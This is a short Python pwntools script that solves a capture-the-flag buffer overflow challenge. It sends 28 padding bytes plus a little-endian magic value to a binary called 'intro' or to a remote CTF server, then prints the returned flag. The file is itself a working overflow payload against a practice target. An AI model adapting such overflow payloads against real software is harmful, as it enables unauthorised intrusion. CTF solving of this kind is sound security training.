#!/usr/bin/python
# pip install pwntools
from pwn import *

payload = b""
# fill up buffer
payload += b"A" * 28
# overwrite variable
payload += b"\xbe\xba\xde\xc0"
# trigger scanf
payload += b"\n"

# change this if running on remote
LOCAL = True

if LOCAL:
    # open local connection
    # false flag duhh....
    conn = process("./intro")
else:
    # connect to remote server running the programm
    conn = remote("ctf.uniwa.gr",30718)

# flush the buffer until remote is ready to receive input
conn.recvuntil(b'Please enter your name:\n')
# send out payload optionally use sendline() without \n in payload
conn.send(payload)

# receive line from remote
conn.recvuntil(b"flag!\n")
print(conn.recvline().decode())







